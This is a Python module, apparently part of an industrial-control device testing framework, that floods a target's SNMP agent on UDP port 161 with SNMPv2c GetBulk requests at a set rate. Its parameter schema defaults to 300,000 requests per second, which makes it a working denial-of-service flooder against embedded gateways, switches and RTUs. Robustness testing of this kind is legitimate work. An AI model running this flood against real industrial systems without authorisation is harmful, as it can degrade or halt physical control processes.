"""
測項：SNMP GetBulk 高頻率查詢洪水
分類：SNMP（許多工控閘道器/交換器/RTU 都開放 SNMP 做設備管理，預設埠 161/UDP）
說明：以受控速率重複送出 SNMPv2c GetBulkRequest，測試裝置的 SNMP Agent
     在高頻率查詢下的回應能力與 CPU 負載影響（許多嵌入式裝置的 SNMP Agent
     實作相對陽春，容易因大量查詢而拖慢主要控制功能）。

實作：使用自製最小 BER 編碼器（見同目錄 `_ber.py`）組合合法的 SNMPv2c 封包，
     不依賴 pysnmp，減少部署依賴；每次查詢的 request-id 會遞增，行為與真實
     SNMP 管理端一致。
需求：無額外套件，純標準函式庫。
"""
import socket
import time

from ..common import RateLimiter, clamp_duration
from ._ber import build_snmp_v2c_getbulk

NAME = "SNMP GetBulk 高頻率查詢洪水"
CATEGORY = "SNMP"
PROTOCOL = "UDP"
DEFAULT_PORT = 161
TEST_TYPE = "traffic"  # 流量型：高頻率查詢洪水，靠封包速率本身造成 Agent 負擔

def get_param_schema() -> dict:
    return {
        "rate_per_sec": {"type": "int", "default": 300000, "min": 1, "max": 300000, "desc": "每秒查詢次數"},
        "community": {"type": "string", "default": "public", "desc": "SNMP community string"},
        "oid": {"type": "string", "default": "1.3.6.1.2.1.1", "desc": "查詢起始 OID（預設 system 子樹）"},
        "max_repetitions": {"type": "int", "default": 10, "min": 1, "max": 100},
    }


def run(target, port, protocol, duration, params, stop_event, log_fn):
    duration = clamp_duration(duration)
    rate = int(params.get("rate_per_sec", 350))
    community = params.get("community", "public")
    oid = params.get("oid", "1.3.6.1.2.1.1")
    max_rep = int(params.get("max_repetitions", 10))

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(0.5)

    limiter = RateLimiter(rate)
    sent, recv, errors = 0, 0, 0
    request_id = 1
    start = time.time()

    log_fn(f"[+] SNMP GetBulk -> {target}:{port} @ {rate}/s, oid={oid}")
    while time.time() - start < duration and not (stop_event and stop_event.is_set()):
        limiter.wait()
        pkt = build_snmp_v2c_getbulk(community, oid, request_id, max_repetitions=max_rep)
        try:
            sock.sendto(pkt, (target, port))
            sent += 1
            request_id += 1
            try:
                sock.recv(4096)
                recv += 1
            except socket.timeout:
                pass
        except OSError as e:
            errors += 1
            if errors <= 5:
                log_fn(f"[!] send error: {e}")

    sock.close()
    return {
        "requests_sent": sent, "responses_received": recv, "errors": errors,
        "elapsed_sec": round(time.time() - start, 1),
    }
